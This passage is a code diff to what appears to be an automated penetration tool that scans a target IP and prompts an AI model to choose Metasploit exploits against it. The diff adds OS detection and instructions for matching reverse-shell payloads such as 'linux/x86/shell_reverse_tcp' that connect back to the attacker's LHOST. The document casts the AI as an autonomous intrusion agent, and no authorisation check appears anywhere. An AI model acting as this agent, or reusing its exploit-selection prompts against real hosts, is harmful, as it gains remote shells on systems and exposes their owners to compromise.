@@ -346,10 +346,12 @@ If the output above already proves execution on the target, set done=true.
         self.cleanup_sessions()
         print(f"\n>>> [FASE 1] RECONHECIMENTO")
         rec = recon.scan(self.target_ip)
+        self.os_hint = rec.get("os", "") or "unknown"
         self.services = rec.get("ports", {})
         if self.only_port:
             self.services = {pp: ii for pp, ii in self.services.items() if str(pp) == self.only_port}
         print(f"    [*] Metodo de scan: {rec.get('method')}")
+        print(f"    [*] OS detectado (recon): {self.os_hint}")
         if not self.services:
             print(f"{C_RED}[!] Nenhuma porta aberta encontrada.{C_RESET}")
             return
@@ -423,6 +425,7 @@ If the output above already proves execution on the target, set done=true.
             TARGET IP (RHOST): {self.target_ip}
             TARGET PORT (RPORT): {port}
             ATTACKER IP (LHOST): {self.attacker_ip}
+            TARGET OS (detected by recon; use it to pick TARGET index and PAYLOAD): {self.os_hint}
             SERVICE BANNER:
             "{banner}"
             {_prev_note}
@@ -448,6 +451,11 @@ If the output above already proves execution on the target, set done=true.
                - If the exploit requires a Reverse Shell, include "LHOST": "{self.attacker_ip}" and an "LPORT" (e.g., "4444").
                - If it is a Bind Shell or does not require a reverse connection, OMIT LHOST and LPORT.
                - For exploits, usually set "DisablePayloadHandler": "false".
+               - MATCH THE OS (see TARGET OS above): for a module with multiple TARGETs
+                 (e.g. 0=Windows, 1=Linux), set "TARGET" to the index whose label matches
+                 the detected OS, and pick a PAYLOAD for that same OS (Linux ->
+                 "linux/x86/shell_reverse_tcp" or "cmd/unix/reverse"; Windows -> "windows/...").
+                 A PAYLOAD that mismatches the TARGET fails with "not a compatible payload".
                - Do NOT include USERNAME or PASSWORD in the options for brute force modules, the script handles that.
             5. Use EXPLOITS only when there is a STRONG MATCH between:
                - service
